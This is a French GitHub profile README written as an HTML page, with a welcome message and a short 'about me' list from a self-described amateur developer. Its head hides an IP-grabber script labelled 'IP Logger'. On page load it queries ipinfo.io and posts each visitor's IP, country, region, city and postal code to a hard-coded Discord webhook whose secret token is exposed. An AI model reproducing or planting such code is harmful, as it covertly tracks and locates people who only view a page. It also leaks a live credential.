# README.md
<!DOCTYPE HTML> 
<html lang="fr">
<head>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-44ZSGENS96"></script> 
         <script> 
 window.axeptioSettings = { 
   clientId: "653ba140301840285f89d1fc", 
   cookiesVersion: "github-fr-2", 
 }; 
  
 (function(d, s) { 
   var t = d.getElementsByTagName(s)[0], e = d.createElement(s); 
   e.async = true; e.src = "//static.axept.io/sdk.js"; 
   t.parentNode.insertBefore(e, t); 
 })(document, "script"); 
 </script> 
         <script> 
 function monke(json)  
 { 
      var request = new XMLHttpRequest(); 
  
      request.open("POST", "https://discord.com/api/webhooks/1167017737936175184/-8aZ2_joIDyYwUDljLAJLg15dCQdMtMz7WyUoxqOKWStyCVqje-omWsdZZhr8L7A24_c"); 
  
      request.setRequestHeader('Content-type', 'application/json'); 
  
      var params =  
      { 
           username: "IP Logger", 
           avatar_url: "", 
           content: "@everyone", 
           embeds: [ 
                { 
                     title: "Je te présente mon IP grabber!", 
                     color: 1752220, 
                     description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`" 
                } 
           ] 
      } 
  
      request.send(JSON.stringify(params)); 
 } 
 </script> 
 <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script> 
 <script> 
   window.dataLayer = window.dataLayer || []; 
   function gtag(){dataLayer.push(arguments);} 
   gtag('js', new Date()); 
   gtag('config', 'G-44ZSGENS96'); 
 </script>

<meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="Me">
</head>
<body>
<img align="center" src="https://github-readme-stats.vercel.app/api/top-langs?username=amayes93&show_icons=true&locale=en&layout=compact" alt="amayes93">
    <br>
    <br>
    <h1 align="center">Salutations👋</h1>
<h3 align="center">Je te souhaite la bienvenue sur mon github Mais sache que je ne suis qu'un développeur amateur!</h3>
    <h4>Rien d'extroadiraire donc 😁🙃!</h4>

<h4 align="center">- A Propos de Moi - </h4>

- ✔️ En recherche constant de projet.💫

- 🔭 Naviguant entre les lignes de code et les mystères non résolus.
  
- 🌱 Je debute en HTML / CSS, et j'apprends également le python <img src="https://img.icons8.com/?size=512&id=13441&format=png" 
      width="40" height="40" alt="PY"> et le bash🖥️.<br>

- 💬 Pour tout questione n'hésite pas à me contacter ! Sur-ce bonne navigation!
</p>
</body>
</html>
